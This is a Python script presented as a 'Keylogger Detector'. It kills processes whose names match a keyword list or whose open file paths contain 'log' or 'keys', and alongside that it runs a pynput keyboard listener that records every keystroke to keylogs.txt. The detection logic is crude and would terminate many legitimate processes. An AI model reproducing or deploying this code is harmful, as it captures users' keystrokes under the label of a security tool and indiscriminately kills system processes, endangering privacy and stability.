import psutil
import os
import time
import logging
from pynput import keyboard

# Setup logging
logging.basicConfig(filename="keylogger_detector.log", level=logging.INFO, format='%(asctime)s - %(message)s')

# File to save pressed keys
KEYLOG_FILE = "keylogs.txt"

# List of suspicious process keywords
SUSPICIOUS_KEYWORDS = ["keylogger", "logkeys", "hook", "intercept", "capture"]

def detect_suspicious_processes():
    """Check for suspicious keylogger processes."""
    for process in psutil.process_iter(attrs=['pid', 'name', 'open_files']):
        try:
            process_name = process.info['name'].lower()
            
            # Check for suspicious names
            if any(keyword in process_name for keyword in SUSPICIOUS_KEYWORDS):
                pid = process.info['pid']
                logging.warning(f"[ALERT] Suspicious process detected: {process_name} (PID: {pid})")
                print(f"[ALERT] Suspicious process detected and terminated: {process_name} (PID: {pid})")
                psutil.Process(pid).terminate()

            # Check if the process has opened suspicious log files
            if process.info['open_files']:
                for file in process.info['open_files']:
                    if "log" in file.path or "keys" in file.path:
                        logging.warning(f"[ALERT] Process {process_name} is accessing log files: {file.path}")
                        print(f"[ALERT] {process_name} might be logging keystrokes! File: {file.path}")
                        psutil.Process(process.info['pid']).terminate()
                        
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue

def log_key(key):
    """Logs key presses into a file."""
    try:
        key_str = str(key).replace("'", "")  # Clean key format
        with open(KEYLOG_FILE, "a") as f:
            f.write(key_str + "\n")
    except Exception as e:
        logging.error(f"Error logging key: {e}")

def monitor_keyboard():
    """Detects and logs keyboard activity."""
    with keyboard.Listener(on_press=log_key) as listener:
        listener.join()

def main():
    print("Starting Keylogger Detector...")

    # Run keylogger detection in the background
    while True:
        detect_suspicious_processes()
        time.sleep(10)  # Check every 10 seconds

# Run both keylogger detection and keylogging
if __name__ == "__main__":
    from threading import Thread

    # Start process monitoring
    detector_thread = Thread(target=main, daemon=True)
    detector_thread.start()

    # Start keylogging
    monitor_keyboard()
